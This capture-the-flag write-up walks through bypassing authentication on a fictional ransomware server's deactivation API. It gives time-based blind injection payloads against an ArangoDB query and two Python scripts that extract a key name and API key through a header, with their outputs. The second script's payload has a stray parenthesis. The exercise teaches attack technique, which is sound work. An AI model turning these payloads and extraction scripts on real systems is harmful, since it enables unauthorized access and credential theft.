# Deactivate Frostbit Naughty-Nice List Publication

Difficulty: :material-star::material-star::material-star::material-star::material-star:

## Objective

!!! question "Task description"

    Wombley's ransomware server is threatening to publish the Naughty-Nice list. Find a way to deactivate the publication of the Naughty-Nice list by the ransomware server.

## Hints

??? tip "Frostbit Publication"

    There must be a way to deactivate the ransomware server's data publication. Perhaps one of the {==other North Pole assets revealed something==} that could help us find the deactivation path. If so, we might be able to {==trick the Frostbit infrastructure into revealing more details==}.

??? tip "Frostbit Slumber"

    The Frostbit author may have {==mitigated the use of certain characters, verbs, and simple authentication bypasses==}, leaving us {==blind==} in this case. Therefore, we might need to trick the application into responding differently based on our input and measure its response. If we know the {==underlying technology used for data storage==}, we can replicate it locally using Docker containers, allowing us to develop and test techniques and payloads with greater insight into how the application functions.

## Solution

!!! warning "Warning"

    This challenge only has a gold achievement.

!!! warning "Warning"

    This challenge requires you to have access to some information learned from the [Decrypt](decrypt.md) challenge.

### Recon

The challenge [Santa Vision](santa_vision.md) gave us a hint in a MQTT message on the `frostbitfeed` topic:

```
Error msg: Unauthorized access attempt. /api/v1/frostbitadmin/bot/<botuuid>/deactivate, authHeader: X-API-Key, status: Invalid Key, alert: Warning, recipient: Wombley
```

This is an API endpoint that seems to be used for deactivation functionality. We can get a bot UUID by following the first steps for the [Decrypt](decrypt.md) challenge.

The hints indicate to us that we need to look for a blind injection vulnerability while dealing with a filter. From [Decrypt](decrypt.md) we also learn that there is a debug setting that can be enabled. The following curl command will trigger an error (change bot UUID accordingly):

```title="Request"
curl -X GET "https://api.frostbit.app/api/v1/frostbitadmin/bot/cf9b1b33-b17b-433b-a473-2d8c5f06c1a5/deactivate?debug=1" -H "X-API-Key: '"
```

```json title="Response"
{
  "debug": true,
  "error": "Timeout or error in query:\nFOR doc IN config\n    FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n    <other_query_lines_omitted>\n    RETURN doc"
}
```

We learn that injection is possible and we get a glimpse of the query used, which appears to be for [ArangoDB](https://docs.arangodb.com/stable/about-arangodb/) DBMS:

??? example "AI usage"

    ChatGPT was used to find the DBMS based on the error message.

```sql title="ArangoDB query"
FOR doc IN config
    FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'
    <other_query_lines_omitted>
    RETURN doc
```

We know that we must look for [blind injection](https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-time-delays). Specifically, we will work with time delays. The conditions in the query are processed synchronously on whether they are true or false. The moment the complete condition is considered to be either, the rest of the condition won't be processed. If we insert a delay at the end of the expression, we can check whether we reached that point of the conditions and thus test conditions to be true or false.

```sql title="Blind injection using time delays"
-- This query doesn't get to the sleep, because the condition fails at the 1==2, causing the expression to completely fail
' OR 1==2 AND SLEEP(1) AND '

-- This query sleeps 1s because it keeps resolving after the OR, as the expression can still resolve to true
' OR 1==2 OR SLEEP(1) AND '
```

### Injection

We can now start learning more about the content in the database. The `doc` variable is likely an object since it has keys. Any query that takes more than 1 second must be false until at least the delay condition. This can be done by trial and error but eventually a script will support us.

!!! note "1. Number of attributes"

    The ```doc``` object has one attribute:

    ``` sql
    -- We check the attributes that are not part of system, and we find 1
    value' OR LENGTH(ATTRIBUTES(doc, true)) == 1 OR SLEEP(1) OR '
    ```

!!! note "2. Name of key"

    The ```doc``` key can be found using a script.

    ??? example "AI usage"

        ChatGPT supported the generation of the Python script to figure out the key name.

    ??? note "Python script using 0.5s delay"

        ``` py
        import requests
        import string
        import time

        # Target endpoint
        url = "https://api.frostbit.app/api/v1/frostbitadmin/bot/cf9b1b33-b17b-433b-a473-2d8c5f06c1a5/deactivate?debug=1"

        # Header to test
        header_name = "X-API-Key"

        # Characters to test
        characters = string.ascii_letters + string.digits + string.punctuation

        # Function to test each character
        def test_character(position, char):
            payload = f"' OR SUBSTRING(ATTRIBUTES(doc)[0], {position}, 1) == '{char}' OR SLEEP(0.5) OR '"
            headers = {header_name: payload}

            start_time = time.time()
            response = requests.get(url, headers=headers)
            elapsed_time = time.time() - start_time

            # If time delay is insignificant, the character matches
            return elapsed_time < 0.5

        # Main function to brute-force the key
        def find_key():
            key = ""
            position = 0

            while True:
                found_char = None

                for char in characters:
                    # Exclude filtered characters from test
                    if char not in ["'", "`", ";", "/", "\\", "*"]:
                        print(f"Testing position {position} with character '{char}'")

                        if test_character(position, char):
                            key += char
                            found_char = char
                            print(f"Found character: {char} at position {position}")
                            break

                if not found_char:
                    print("No more characters found. Brute-force completed.")
                    break

                position += 1

            return key

        if __name__ == "__main__":
            print("Starting SQL Injection Test...")
            key = find_key()
            print(f"Discovered key name: {key}")
        ```

    ``` title="Output"
    No more characters found. Brute-force completed.
    Discovered key name: deactivate_api_key
    ```

!!! note "3. Value of key"

    The ```doc``` key value can be found using the same script with small alterations and using the key name we found in the previous step.

    ??? note "Python script using 0.5s delay"

        ``` py
        import requests
        import string
        import time

        # Target endpoint
        url = "https://api.frostbit.app/api/v1/frostbitadmin/bot/cf9b1b33-b17b-433b-a473-2d8c5f06c1a5/deactivate?debug=1"

        # Header to test
        header_name = "X-API-Key"

        # Characters to test
        characters = string.ascii_letters + string.digits + string.punctuation

        # Function to test each character
        def test_character(position, char):
            payload = f"' OR SUBSTRING(doc.deactivate_api_key), {position}, 1) == '{char}' OR SLEEP(0.5) OR '"
            headers = {header_name: payload}

            start_time = time.time()
            response = requests.get(url, headers=headers)
            elapsed_time = time.time() - start_time

            # If time delay is insignificant, the character matches
            return elapsed_time < 0.5

        # Main function to brute-force the key
        def find_key():
            key = ""
            position = 0

            while True:
                found_char = None

                for char in characters:
                    # Exclude filtered characters from test
                    if char not in ["'", "`", ";", "/", "\\", "*"]:
                        print(f"Testing position {position} with character '{char}'")

                        if test_character(position, char):
                            key += char
                            found_char = char
                            print(f"Found character: {char} at position {position}")
                            break

                if not found_char:
                    print("No more characters found. Brute-force completed.")
                    break

                position += 1

            return key

        if __name__ == "__main__":
            print("Starting SQL Injection Test...")
            key = find_key()
            print(f"Discovered API key: {key}")
        ```

    ``` title="Output"
    No more characters found. Brute-force completed.
    Discovered API Key: abe7a6ad-715e-4e6a-901b-c9279a964f91
    ```

!!! success "Answer"

    We have found the API key and can now make a legitimate request:

    ```title="Final request"
    curl -X GET "https://api.frostbit.app/api/v1/frostbitadmin/bot/9c9c27f8-1436-4c04-b5fd-3a473d8c630e/deactivate?debug=1" -H "X-API-Key: abe7a6ad-715e-4e6a-901b-c9279a964f91"
    ```

    ``` json title="Response"
    {
    "message": "Response status code: 200, Response body: {\"result\":\"success\",\"rid\":\"cf9b1b33-b17b-433b-a473-2d8c5f06c1a5\",\"hash\":\"b8f559c581572c6774c8226e18fd924b362fccaab37943a8004446df066fdb69\",\"uid\":\"82455\"}\nPOSTED WIN RESULTS FOR RID cf9b1b33-b17b-433b-a473-2d8c5f06c1a5",
    "status": "Deactivated"
    }
    ```
